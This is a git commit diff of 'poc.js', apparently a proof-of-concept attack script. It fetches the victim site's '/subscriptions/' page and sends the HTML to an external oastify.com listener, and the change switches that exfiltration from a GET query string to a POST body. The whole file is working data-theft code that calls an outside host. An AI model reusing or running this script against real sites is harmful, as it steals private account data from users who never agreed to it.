196913af8fa1aaf8928a55203f9cb8824468f9bb
AusShock <102188905+AusShock@users.noreply.github.com>
2026-02-05 20:44:00 +0100

    poc.js

--- poc.js
+++ poc.js
@@ -1,5 +1,8 @@
 fetch('/subscriptions/')
   .then(r => r.text())
   .then(html => {
-    fetch('https://nc33oyddhrvwqbzd5zuousksqjwak08p.oastify.com/log?data=' + encodeURIComponent(html));
+    fetch('https://nc33oyddhrvwqbzd5zuousksqjwak08p.oastify.com', {
+      method: 'POST',
+      body: html
+    });
   });
